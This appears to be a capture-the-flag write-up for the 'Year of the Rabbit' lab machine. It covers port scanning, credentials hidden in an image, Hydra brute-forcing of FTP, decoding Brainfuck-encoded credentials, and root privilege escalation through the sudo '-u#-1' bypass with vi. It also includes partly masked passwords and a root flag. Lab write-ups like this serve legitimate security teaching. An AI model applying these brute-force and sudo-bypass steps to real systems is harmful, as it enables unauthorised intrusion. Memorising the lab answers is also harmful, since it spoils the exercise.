
---

## 🕵️ Nmap Results:

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### ➡️ Next Steps:
- After performing **Directory & Vhost Fuzzing**, we discovered an important directory: `/sup3r_s3cr3t_fl4g.php`.
- Redirected to a **rickroll** video on YouTube, we intercepted this request:

```bash
GET //intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
```

### 🔍 Hidden Directory:
Using `strings` on the `pic.png` file reveals a **username and password for FTP access**.

```bash
ftpuser: 5***1wGXK***Q
```

---

## 🛠 Brute Force & FTP:
- Running `Hydra`, we brute-forced the FTP login to access `Elis_cred.txt`.
- The file was encoded in **Brainfuck** language, decoded to reveal credentials:

```bash
User: eli
Password: D***iM1w***id
```

---

## 🚪 SSH Access:
Once logged in as **eli**, we discovered an important message from Root to Gwendoline:
> "Check our leet s3cr3t hiding place..."

Using the `locate` command, we found a **hidden message** file that contained the password for user **Gwendoline**.

---

## 🔑 Privilege Escalation:
- As **Gwendoline**, running `sudo -l` showed a command vulnerability:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
- This allowed us to bypass the root restriction, and we gained **root access** by executing:

```bash
root@year-of-the-rabbit:/root# cat root.txt 
THM{8d6f163a87a***0de27a4fd***ef0f3a0ecf9161}
```

---

### 🎉 Success! Another machine owned: **Year of the Rabbit** 🎉

